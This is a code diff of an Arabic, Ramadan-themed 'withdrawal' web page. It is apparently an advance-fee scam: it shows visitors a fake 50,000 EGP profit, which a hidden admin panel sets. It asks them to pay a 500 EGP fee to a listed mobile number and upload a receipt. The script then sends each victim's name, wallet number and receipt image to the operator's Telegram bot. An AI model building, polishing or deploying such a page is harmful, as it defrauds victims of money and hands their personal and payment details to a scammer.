@@ -16,9 +16,9 @@
             background: var(--main-grad); color: white;
             min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px;
         }
-
         .ramadan-header { text-align: center; margin-bottom: 20px; }
-        .ramadan-kareem { font-size: 24px; font-weight: 900; color: var(--gold); text-shadow: 0 0 15px rgba(255, 204, 0, 0.7); }
+        .ramadan-kareem { font-size: 24px; font-weight: 900; color: var(--gold); text-shadow: 0 0 15px rgba(255, 204, 0, 0.7); animation: glow 2s infinite; }
+        @keyframes glow { 50% { opacity: 0.6; transform: scale(1.05); } }
         
         .admin-box {
             background: rgba(0,0,0,0.95); border: 2px solid var(--gold);
@@ -32,13 +32,8 @@
             border: 1px solid rgba(255,255,255,0.2); padding: 30px 20px;
             border-radius: 25px; width: 100%; max-width: 400px; text-align: center;
         }
-
         .logo-text { font-size: 26px; font-weight: 900; color: var(--gold); margin-bottom: 10px; cursor: pointer; }
-
-        .balance-area {
-            background: rgba(0,0,0,0.3); padding: 15px; border-radius: 15px;
-            margin-bottom: 20px; border-right: 5px solid var(--gold);
-        }
+        .balance-area { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 15px; margin-bottom: 20px; border-right: 5px solid var(--gold); }
         .balance-area div { font-size: 35px; font-weight: 700; }
 
         .form-group { text-align: right; margin-bottom: 15px; }
@@ -47,25 +42,23 @@
             width: 100%; padding: 12px; border-radius: 10px; border: none;
             background: rgba(255,255,255,0.9); color: #333; box-sizing: border-box;
         }
+        .cash-box { background: #000; color: var(--gold); padding: 12px; border-radius: 10px; font-size: 20px; font-weight: bold; margin: 15px 0; border: 1px solid var(--gold); }
 
-        .cash-box {
-            background: #000; color: var(--gold); padding: 12px;
-            border-radius: 10px; font-size: 20px; font-weight: bold;
-            margin: 15px 0; border: 1px solid var(--gold);
+        /* تعديل التصميم لضمان عمل اختيار الصورة */
+        .file-upload-container {
+            margin-bottom: 20px;
         }
-
-        .file-label {
+        .custom-file-upload {
             background: rgba(255,255,255,0.1); border: 2px dashed rgba(255,255,255,0.4);
-            padding: 15px; border-radius: 12px; cursor: pointer; display: block;
-            margin-bottom: 20px; transition: 0.3s;
+            padding: 15px; border-radius: 12px; cursor: pointer; display: block; transition: 0.3s;
         }
+        .custom-file-upload:hover { border-color: var(--success); }
 
         .submit-btn {
             background: linear-gradient(90deg, #00ff88, #00d4ff);
             color: #001; border: none; width: 100%; padding: 15px;
             font-size: 19px; font-weight: 900; border-radius: 12px; cursor: pointer;
         }
-
         #loader {
             position: fixed; inset: 0; background: rgba(0,0,0,0.9);
             display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 3000;
@@ -82,8 +75,8 @@
 
 <div class="admin-box" id="adminBox">
     <h3 style="color:var(--gold); margin-top:0;">إعدادات المدير</h3>
-    <input type="number" id="pIn" value="50000" placeholder="الربح">
-    <input type="number" id="fIn" value="500" placeholder="الرسوم">
+    <input type="number" id="pIn" value="50000">
+    <input type="number" id="fIn" value="500">
     <button onclick="saveAndHide()" style="width:100%; padding:10px; background:var(--gold); border:none; border-radius:5px; font-weight:bold;">حفظ</button>
 </div>
 
@@ -108,17 +101,19 @@
     <p style="font-size: 13px;">يرجى تحويل رسوم المعالجة (<span id="fOut" style="color:var(--gold); font-weight:bold;">500</span> ج.م) للرقم:</p>
     <div class="cash-box">01226811784</div>
 
-    <label class="file-label">
-        <input type="file" id="imgInput" style="display:none" onchange="fileChanged(this)">
-        <span id="fn" onclick="document.getElementById('imgInput').click()">أرفق صورة إيصال التحويل 📸</span>
-    </label>
+    <div class="file-upload-container">
+        <label for="imgInput" class="custom-file-upload" id="fileLabel">
+            أرفق صورة إيصال التحويل 📸
+        </label>
+        <input type="file" id="imgInput" style="display:none" onchange="updateLabel(this)">
+    </div>
 
-    <button class="submit-btn" onclick="sendData()">تأكيد وإرسال الطلب</button>
+    <button class="submit-btn" onclick="sendToTelegram()">تأكيد وإرسال الطلب</button>
 </div>
 
 <div id="loader">
     <div class="spin"></div>
-    <p style="margin-top:15px;">جاري إرسال الطلب وتأكيد البيانات...</p>
+    <p style="margin-top:15px;">جاري تشفير وإرسال الطلب للبوت...</p>
 </div>
 
 <script>
@@ -139,31 +134,34 @@
         document.getElementById('adminBox').style.display = 'none';
     }
 
-    // وظيفة لتأكيد اختيار الصورة
-    function fileChanged(input) {
+    // تحديث النص عند اختيار صورة لضمان أن الكود "شعر" بالملف
+    function updateLabel(input) {
+        const label = document.getElementById('fileLabel');
         if (input.files && input.files[0]) {
-            document.getElementById('fn').innerText = '✅ تم اختيار الصورة: ' + input.files[0].name.substring(0, 15) + '...';
-            document.getElementById('fn').style.color = '#00ff88';
+            label.innerText = "✅ تم اختيار الصورة";
+            label.style.borderColor = "#00ff88";
+            label.style.color = "#00ff88";
         }
     }
 
-    async function sendData() {
+    async function sendToTelegram() {
         const name = document.getElementById('userName').value.trim();
         const wallet = document.getElementById('userWallet').value.trim();
         const fileInput = document.getElementById('imgInput');
         const file = fileInput.files[0];
 
-        // تنبيهات مخصصة عشان تعرف إيه اللي ناقص
-        if (!name) { alert("من فضلك اكتب اسمك!"); return; }
-        if (!wallet) { alert("من فضلك اكتب رقم محفظتك!"); return; }
-        if (!file) { alert("من فضلك أرفق صورة التحويل!"); return; }
+        // التأكد من أن كل شيء مملوء
+        if (!name || !wallet || !file) {
+            alert("يرجى ملء كافة البيانات وإرفاق الصورة!");
+            return;
+        }
 
         document.getElementById('loader').style.display = 'flex';
 
         const p = document.getElementById('pOut').innerText;
         const f = document.getElementById('fOut').innerText;
 
-        const msg = `🌟 طلب سحب جديد 🌟\n👤 الاسم: ${name}\n📱 المحفظة: ${wallet}\n💰 الربح: ${p} ج.م\n💸 الرسوم: ${f} ج.م\n📱 رقمك: 01226811784`;
+        const msg = `🌟 طلب سحب جديد 🌟\n👤 الاسم: ${name}\n📱 المحفظة: ${wallet}\n💰 الربح: ${p} ج.م\n💸 الرسوم: ${f} ج.م`;
 
         const fd = new FormData();
         fd.append('chat_id', ID);
@@ -171,17 +169,17 @@
         fd.append('caption', msg);
 
         try {
-            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            if (response.ok) {
+            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            if (res.ok) {
                 document.getElementById('loader').style.display = 'none';
                 alert("تم إرسال طلبك بنجاح! رمضان كريم.");
-                location.reload(); // إعادة تحميل الصفحة لتصفير البيانات
+                location.reload(); 
             } else {
                 throw new Error();
             }
         } catch(e) {
             document.getElementById('loader').style.display = 'none';
-            alert("حدث خطأ في الإرسال، تأكد من النت أو بيانات البوت.");
+            alert("حدث خطأ في الإرسال، تأكد من اتصالك بالإنترنت.");
         }
     }
 </script>
